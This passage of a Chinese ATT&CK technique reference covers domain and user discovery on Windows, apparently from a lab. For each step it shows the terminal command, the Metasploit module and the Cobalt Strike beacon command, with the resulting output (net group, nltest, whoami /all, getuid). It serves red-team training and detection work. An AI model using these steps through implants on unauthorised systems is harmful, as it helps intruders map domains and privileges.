<h2><a id="user-content-remote-system-discovery远程系统发现" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#remote-system-discovery%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E7%8E%B0"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Remote System Discovery(远程系统发现)</h2>
<h3><a id="user-content-get-the-list-of-domain-computers获取域主机列表" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#get-the-list-of-domain-computers%E8%8E%B7%E5%8F%96%E5%9F%9F%E4%B8%BB%E6%9C%BA%E5%88%97%E8%A1%A8"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get the list of domain computers（获取域主机列表）</h3>
<h4><a id="user-content-terminal下操作-4" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-4"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>net group "Domain Computers" /domain</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>net group <span class="pl-s"><span class="pl-pds">"</span>Domain Computers<span class="pl-pds">"</span></span> /domain
这项请求将在域 WORKGROUP 的域控制器处理。

发生系统错误 1355。

指定的域不存在，或无法联系。
</pre></div>
<h4><a id="user-content-msf下操作-6" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-6"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>post/windows/gather/enum_ad_computers</p>
<p>post/windows/gather/enum_computers</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>msf5 post(windows/gather/enum_ad_computers) <span class="pl-k">&gt;</span> exploit 

[-] Unable to find the domain to query.
[<span class="pl-k">*</span>] Post module execution completed

msf5 post(windows/gather/enum_computers) <span class="pl-k">&gt;</span> exploit 

[<span class="pl-k">*</span>] Running module against ROOT-5DE52AC98B
[-] This host is not part of a domain.
[<span class="pl-k">*</span>] Post module execution completed
</pre></div>
<h4><a id="user-content-cs下操作-8" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-8"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>shell net group "Domain Computers" /domain</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>beacon<span class="pl-k">&gt;</span> shell net group <span class="pl-s"><span class="pl-pds">"</span>Domain Computers<span class="pl-pds">"</span></span> /domain
[<span class="pl-k">*</span>] Tasked beacon to run: net group <span class="pl-s"><span class="pl-pds">"</span>Domain Computers<span class="pl-pds">"</span></span> /domain
[+] host called home, sent: 67 bytes
[+] received output:
这项请求将在域 WORKGROUP 的域控制器处理。

发生系统错误 1355。

指定的域不存在，或无法联系</pre></div>
<h3><a id="user-content-get-the-list-of-domain-controllers获取域控列表" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#get-the-list-of-domain-controllers%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E5%88%97%E8%A1%A8"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get the list of domain controllers(获取域控列表)</h3>
<h4><a id="user-content-terminal下操作-5" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-5"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>net group "Domain Controllers" /domain[:DOMAIN]</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>net group <span class="pl-s"><span class="pl-pds">"</span>Domain Controllers<span class="pl-pds">"</span></span> /domain
这项请求将在域 WORKGROUP 的域控制器处理。

发生系统错误 1355。

指定的域不存在，或无法联系</pre></div>
<h4><a id="user-content-cs下操作-9" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-9"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>shell net group "Domain Controllers" /domain</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>beacon<span class="pl-k">&gt;</span> shell net group <span class="pl-s"><span class="pl-pds">"</span>Domain Controllers<span class="pl-pds">"</span></span> /domain
[<span class="pl-k">*</span>] Tasked beacon to run: net group <span class="pl-s"><span class="pl-pds">"</span>Domain Controllers<span class="pl-pds">"</span></span> /domain
[+] host called home, sent: 69 bytes
[+] received output:
这项请求将在域 WORKGROUP 的域控制器处理。

发生系统错误 1355。

指定的域不存在，或无法联系。</pre></div>
<h3><a id="user-content-display-trust-relationship-with-domain-controller显示域信任关系" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#display-trust-relationship-with-domain-controller%E6%98%BE%E7%A4%BA%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Display trust relationship with domain controller(显示域信任关系)</h3>
<h4><a id="user-content-terminal下操作-6" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-6"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>nltest /dclist</p>
</blockquote>
<h3><a id="user-content-display-the-active-directory-login-server-of-the-workstation显示ad域工作组的登录器" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#display-the-active-directory-login-server-of-the-workstation%E6%98%BE%E7%A4%BAad%E5%9F%9F%E5%B7%A5%E4%BD%9C%E7%BB%84%E7%9A%84%E7%99%BB%E5%BD%95%E5%99%A8"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Display the active directory login server of the workstation(显示ad域工作组的登录器)</h3>
<h4><a id="user-content-terminal下操作-7" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-7"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>echo %LOGONSERVER%</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>echo %LOGONSERVER%
<span class="pl-cce">\\</span>ROOT-5DE52AC98B</pre></div>
<h4><a id="user-content-cs下操作-10" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-10"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>shell echo %LOGONSERVER%</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>beacon<span class="pl-k">&gt;</span> shell <span class="pl-c1">echo</span> %LOGONSERVER%
[<span class="pl-k">*</span>] Tasked beacon to run: <span class="pl-c1">echo</span> %LOGONSERVER%
[+] host called home, sent: 49 bytes
[+] received output:
<span class="pl-cce">\\</span>ROOT-5DE52AC98B
</pre></div>
<h2><a id="user-content-system-owneruser-discovery系统用户发现" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#system-owneruser-discovery%E7%B3%BB%E7%BB%9F%E7%94%A8%E6%88%B7%E5%8F%91%E7%8E%B0"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>System Owner/User Discovery（系统用户发现）</h2>
<h3><a id="user-content-get-user-information获取用户信息" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#get-user-information%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Get user information（获取用户信息）</h3>
<h4><a id="user-content-terminal下操作-8" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-8"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>whoami /all /fo list</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>whoami
root-5de52ac98b<span class="pl-cce">\a</span>dministrator

C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>whoami /all

用户信息
----------------

用户名                        SID
============================= =============================================
root-5de52ac98b<span class="pl-cce">\a</span>dministrator S-1-5-21-1911985068-4225083820-4011728908-500


组信息
-----------------

组名                             类型   SID          属性

================================ ====== ============ ===========================
===============
Everyone                         已知组 S-1-1-0      必需的组, 启用于默认, 启用
的组
BUILTIN<span class="pl-cce">\A</span>dministrators           别名   S-1-5-32-544 必需的组, 启用于默认, 启用
的组, 组的所有者
BUILTIN<span class="pl-cce">\U</span>sers                    别名   S-1-5-32-545 必需的组, 启用于默认, 启用
的组
NT AUTHORITY<span class="pl-cce">\I</span>NTERACTIVE         已知组 S-1-5-4      必需的组, 启用于默认, 启用
的组
NT AUTHORITY<span class="pl-cce">\A</span>uthenticated Users 已知组 S-1-5-11     必需的组, 启用于默认, 启用
的组
NT AUTHORITY<span class="pl-cce">\T</span>his Organization   已知组 S-1-5-15     必需的组, 启用于默认, 启用
的组
LOCAL                            已知组 S-1-2-0      必需的组, 启用于默认, 启用
的组
NT AUTHORITY<span class="pl-cce">\N</span>TLM Authentication 已知组 S-1-5-64-10  必需的组, 启用于默认, 启用
的组


特权信息
----------------------

特权名                          描述                       状态
=============================== ========================== ======
SeLockMemoryPrivilege           内存中锁定页面             已禁用
SeChangeNotifyPrivilege         跳过遍历检查               已启用
SeSecurityPrivilege             管理审核和安全日志         已禁用
SeBackupPrivilege               备份文件和目录             已禁用
SeRestorePrivilege              还原文件和目录             已禁用
SeSystemtimePrivilege           更改系统时间               已禁用
SeShutdownPrivilege             关闭系统                   已禁用
SeRemoteShutdownPrivilege       从远程系统强制关机         已禁用
SeTakeOwnershipPrivilege        取得文件或其他对象的所有权 已禁用
SeDebugPrivilege                调试程序                   已禁用
SeSystemEnvironmentPrivilege    修改固件环境值             已禁用
SeSystemProfilePrivilege        配置系统性能               已禁用
SeProfileSingleProcessPrivilege 配置单一进程               已禁用
SeIncreaseBasePriorityPrivilege 增加计划优先级             已禁用
SeLoadDriverPrivilege           装载和卸载设备驱动程序     已禁用
SeCreatePagefilePrivilege       创建页面文件               已禁用
SeIncreaseQuotaPrivilege        调整进程的内存配额         已禁用
SeUndockPrivilege               从扩展坞中取出计算机       已禁用
SeManageVolumePrivilege         执行卷维护任务             已禁用
SeImpersonatePrivilege          身份验证后模拟客户端       已启用
SeCreateGlobalPrivilege         创建全局对象               已启用

C:<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator<span class="pl-k">&gt;</span>whoami /all /fo list

用户信息
----------------

用户名: root-5de52ac98b<span class="pl-cce">\a</span>dministrator
SID:    S-1-5-21-1911985068-4225083820-4011728908-500


组信息
-----------------

组名: Everyone
类型: 已知组
SID:  S-1-1-0
属性: 必需的组, 启用于默认, 启用的组

组名: BUILTIN<span class="pl-cce">\A</span>dministrators
类型: 别名
SID:  S-1-5-32-544
属性: 必需的组, 启用于默认, 启用的组, 组的所有者

组名: BUILTIN<span class="pl-cce">\U</span>sers
类型: 别名
SID:  S-1-5-32-545
属性: 必需的组, 启用于默认, 启用的组

组名: NT AUTHORITY<span class="pl-cce">\I</span>NTERACTIVE
类型: 已知组
SID:  S-1-5-4
属性: 必需的组, 启用于默认, 启用的组

组名: NT AUTHORITY<span class="pl-cce">\A</span>uthenticated Users
类型: 已知组
SID:  S-1-5-11
属性: 必需的组, 启用于默认, 启用的组

组名: NT AUTHORITY<span class="pl-cce">\T</span>his Organization
类型: 已知组
SID:  S-1-5-15
属性: 必需的组, 启用于默认, 启用的组

组名: LOCAL
类型: 已知组
SID:  S-1-2-0
属性: 必需的组, 启用于默认, 启用的组

组名: NT AUTHORITY<span class="pl-cce">\N</span>TLM Authentication
类型: 已知组
SID:  S-1-5-64-10
属性: 必需的组, 启用于默认, 启用的组


特权信息
----------------------

特权名: SeLockMemoryPrivilege
描述:   内存中锁定页面
状态:   已禁用

特权名: SeChangeNotifyPrivilege
描述:   跳过遍历检查
状态:   已启用

特权名: SeSecurityPrivilege
描述:   管理审核和安全日志
状态:   已禁用

特权名: SeBackupPrivilege
描述:   备份文件和目录
状态:   已禁用

特权名: SeRestorePrivilege
描述:   还原文件和目录
状态:   已禁用

特权名: SeSystemtimePrivilege
描述:   更改系统时间
状态:   已禁用

特权名: SeShutdownPrivilege
描述:   关闭系统
状态:   已禁用

特权名: SeRemoteShutdownPrivilege
描述:   从远程系统强制关机
状态:   已禁用

特权名: SeTakeOwnershipPrivilege
描述:   取得文件或其他对象的所有权
状态:   已禁用

特权名: SeDebugPrivilege
描述:   调试程序
状态:   已禁用

特权名: SeSystemEnvironmentPrivilege
描述:   修改固件环境值
状态:   已禁用

特权名: SeSystemProfilePrivilege
描述:   配置系统性能
状态:   已禁用

特权名: SeProfileSingleProcessPrivilege
描述:   配置单一进程
状态:   已禁用

特权名: SeIncreaseBasePriorityPrivilege
描述:   增加计划优先级
状态:   已禁用

特权名: SeLoadDriverPrivilege
描述:   装载和卸载设备驱动程序
状态:   已禁用

特权名: SeCreatePagefilePrivilege
描述:   创建页面文件
状态:   已禁用

特权名: SeIncreaseQuotaPrivilege
描述:   调整进程的内存配额
状态:   已禁用

特权名: SeUndockPrivilege
描述:   从扩展坞中取出计算机
状态:   已禁用

特权名: SeManageVolumePrivilege
描述:   执行卷维护任务
状态:   已禁用

特权名: SeImpersonatePrivilege
描述:   身份验证后模拟客户端
状态:   已启用

特权名: SeCreateGlobalPrivilege
描述:   创建全局对象
状态:   已启用
</pre></div>
<h4><a id="user-content-msf下操作-7" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-7"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>getuid</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>meterpreter <span class="pl-k">&gt;</span> getuid
Server username: ROOT-5DE52AC98B<span class="pl-cce">\A</span>dministrator
</pre></div>
<h4><a id="user-content-cs下操作-11" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-11"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>shell whoami /all /fo list</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>beacon<span class="pl-k">&gt;</span> shell whoami /all /fo list
[<span class="pl-k">*</span>] Tasked beacon to run: whoami /all /fo list
[+] host called home, sent: 51 bytes
[+] received output:

用户信息
----------------

用户名: root-5de52ac98b<span class="pl-cce">\a</span>dministrator
SID:    S-1-5-21-1911985068-4225083820-4011728908-500


组信息
-----------------

组名: Everyone
类型: 已知组
SID:  S-1-1-0
属性: 必需的组, 启用于默认, 启用的组

组名: BUILTIN<span class="pl-cce">\A</span>dministrators
类型: 别名
SID:  S-1-5-32-544
属性: 必需的组, 启用于默认, 启用的组, 组的所有者

组名: BUILTIN<span class="pl-cce">\U</span>sers
类型: 别名
SID:  S-1-5-32-545
属性: 必需的组, 启用于默认, 启用的组

组名: NT AUTHORITY<span class="pl-cce">\I</span>NTERACTIVE
类型: 已知组
SID:  S-1-5-4
属性: 必需的组, 启用于默认, 启用的组

组名: NT AUTHORITY<span class="pl-cce">\A</span>uthenticated Users
类型: 已知组
SID:  S-1-5-11
属性: 必需的组, 启用于默认, 启用的组

组名: NT AUTHORITY<span class="pl-cce">\T</span>his Organization
类型: 已知组
SID:  S-1-5-15
属性: 必需的组, 启用于默认, 启用的组

组名: LOCAL
类型: 已知组
SID:  S-1-2-0
属性: 必需的组, 启用于默认, 启用的组

组名: NT AUTHORITY<span class="pl-cce">\N</span>TLM Authentication
类型: 已知组
SID:  S-1-5-64-10
属性: 必需的组, 启用于默认, 启用的组


特权信息
----------------------

特权名: SeLockMemoryPrivilege
描述:   内存中锁定页面
